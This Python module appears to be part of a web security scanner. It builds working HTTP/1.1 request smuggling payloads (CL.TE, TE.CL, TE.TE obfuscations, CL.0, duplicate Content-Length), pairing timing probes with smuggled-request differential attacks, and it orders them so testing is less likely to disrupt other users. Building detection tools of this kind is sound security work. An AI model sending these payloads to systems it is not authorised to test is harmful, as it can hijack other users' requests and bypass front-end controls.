"""Byte-exact HTTP/1.1 desync probe payloads, one builder per technique.

Each :class:`Technique` produces two byte-exact payloads for the raw sender:

* a **timing probe** -- crafted so the back-end is left waiting for body bytes
  that never arrive *if* the target has this front/back parsing discrepancy,
  producing a hang (the timing signal that raises a *candidate*); and
* a **differential attack** -- smuggles a prefix that requests a distinct marker
  resource, so a following well-formed request comes back materially different
  *if* the desync is real (upgrading a candidate to *confirmed*).

The techniques are the HTTP/1.1 desync family of V0.1-CRITERIA.md criterion 1:
CL.TE, TE.CL, TE.TE (a Transfer-Encoding obfuscation dictionary), CL.0, and
conflicting/duplicate Content-Length (``dup-CL``). Payloads implement James
Kettle / PortSwigger's published techniques -- no Burp/HRS code is vendored.

Safe-testing ordering (criterion 4): CL.TE has ``safe_order`` 0 so it is always
probed before TE.CL -- a TE.CL timing probe can hang and disrupt *other* users if
the target is in fact CL.TE.

These are **request** builders: they never normalise anything. Response bytes are
handled elsewhere and are treated as data (R5).
"""

from __future__ import annotations

from dataclasses import dataclass, field

__all__ = [
    "Technique",
    "TE_OBFUSCATIONS",
    "all_techniques",
    "technique_by_name",
    "DESYNC_REFERENCES",
]

DESYNC_REFERENCES: tuple[str, ...] = (
    "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn",
    "https://portswigger.net/web-security/request-smuggling",
    "https://portswigger.net/web-security/request-smuggling/finding",
)

# The Transfer-Encoding obfuscation dictionary for TE.TE: each entry is a raw
# header line that a *lenient* parser reads as "chunked" but a *strict* parser
# does not (or vice versa). One server in the chain is fooled -> the two disagree
# on framing. Values are exact bytes (no normalisation).
TE_OBFUSCATIONS: tuple[tuple[str, bytes], ...] = (
    ("space-before-colon", b"Transfer-Encoding : chunked"),
    ("tab-after-colon", b"Transfer-Encoding:\tchunked"),
    ("vertical-tab", b"Transfer-Encoding:\x0bchunked"),
    ("dup-identity-chunked", b"Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"),
    ("chunked-comma-identity", b"Transfer-Encoding: chunked, identity"),
    ("x-prefixed", b"Transfer-Encoding: xchunked"),
    ("quoted-value", b'Transfer-Encoding: "chunked"'),
    ("leading-space-value", b"Transfer-Encoding:  chunked"),
)

_PLAIN_TE = b"Transfer-Encoding: chunked"


def _crlf(*lines: bytes) -> bytes:
    """Join header lines with CRLF and terminate the header block."""
    return b"\r\n".join(lines) + b"\r\n\r\n"


def _smuggled_request(host: str, marker_path: str) -> bytes:
    """A complete smuggled inner request targeting the marker resource."""
    return _crlf(
        f"GET {marker_path} HTTP/1.1".encode(),
        f"Host: {host}".encode(),
        b"X-Dg-Smuggle: 1",
    )


@dataclass(frozen=True, slots=True)
class Technique:
    """One desync technique and its byte-exact probe payloads.

    Attributes:
        name: The finding ``vector`` / discrepancy class (e.g. ``"CL.TE"``).
        discrepancy: The ``X.Y`` discrepancy label (mirrors ``name``).
        safe_order: Lower is probed earlier (CL.TE before TE.CL -- criterion 4).
        variant: A specific mutator (the TE.TE obfuscation name), or ``None``.
        te_header: The raw Transfer-Encoding header bytes this technique uses
            (obfuscated for TE.TE, plain for CL.TE/TE.CL).
    """

    name: str
    discrepancy: str
    safe_order: int
    variant: str | None = None
    te_header: bytes = _PLAIN_TE
    references: tuple[str, ...] = field(default=DESYNC_REFERENCES)

    # -- timing probes -----------------------------------------------------

    def timing_probe(self, host: str, path: str = "/") -> bytes | None:
        """Byte-exact timing probe, or ``None`` if this technique is differential-only.

        CL.0 and dup-CL have no reliable hang signature (the back-end reads a
        zero-length body and answers immediately); they are confirmed by the
        differential stage instead.
        """
        kind = self.name
        if kind in ("CL.TE", "TE.TE"):
            # front uses Content-Length (4 => "1\r\nA"), back uses chunked and is
            # left waiting for the next chunk -> hang.
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                b"Content-Length: 4",
                self.te_header,
            )
            return head + b"1\r\nA\r\nX"
        if kind == "TE.CL":
            # front uses chunked (stops at "0\r\n\r\n"), back uses Content-Length
            # (6) and is left waiting for the 6th body byte -> hang.
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                b"Content-Length: 6",
                _PLAIN_TE,
            )
            return head + b"0\r\n\r\nX"
        return None

    # -- differential attacks ---------------------------------------------

    def differential_attack(self, host: str, marker_path: str, path: str = "/") -> bytes:
        """Byte-exact smuggling attack whose leftover requests ``marker_path``."""
        kind = self.name
        smuggled = _smuggled_request(host, marker_path)

        if kind in ("CL.TE", "TE.TE"):
            # front (CL) forwards the whole body; back (chunked) stops at the
            # terminator, leaving the smuggled request as a prefix.
            body = b"0\r\n\r\n" + smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
                self.te_header,
            )
            return head + body

        if kind == "TE.CL":
            # front (chunked) forwards the whole body; back (CL) reads only the
            # chunk-size line, leaving the chunk data (the smuggled request).
            chunk_data = smuggled
            size_line = f"{len(chunk_data):x}".encode() + b"\r\n"
            body = size_line + chunk_data + b"\r\n" + b"0\r\n\r\n"
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(size_line)}".encode(),
                _PLAIN_TE,
            )
            return head + body

        if kind == "CL.0":
            # front honours Content-Length; back treats the request as bodyless
            # (CL.0), so the body is reinterpreted as the next request.
            body = smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
            )
            return head + body

        if kind == "dup-CL":
            # two conflicting Content-Length headers: front honours the first
            # (the real body length), back honours the last (0) -> the body is
            # left over as the next request.
            body = smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
                b"Content-Length: 0",
            )
            return head + body

        raise ValueError(f"unknown technique {kind!r}")


def all_techniques() -> list[Technique]:
    """Every v0.1 technique, in safe probe order (CL.TE first, TE.CL later).

    TE.TE expands to one technique per obfuscation in :data:`TE_OBFUSCATIONS`.
    """
    techs: list[Technique] = [
        Technique("CL.TE", "CL.TE", safe_order=0),
        Technique("CL.0", "CL.0", safe_order=1),
        Technique("dup-CL", "dup-CL", safe_order=2),
    ]
    # TE.TE obfuscation dictionary -- probed after CL.TE, before the raw TE.CL.
    for i, (variant, header) in enumerate(TE_OBFUSCATIONS):
        techs.append(
            Technique("TE.TE", "TE.TE", safe_order=3, variant=variant, te_header=header)
        )
    # TE.CL last: its timing probe can hang a CL.TE target, so never before CL.TE.
    techs.append(Technique("TE.CL", "TE.CL", safe_order=9))
    return sorted(techs, key=lambda t: t.safe_order)


def technique_by_name(name: str) -> list[Technique]:
    """Return the technique(s) matching ``name`` (TE.TE -> the whole dictionary)."""
    return [t for t in all_techniques() if t.name == name]
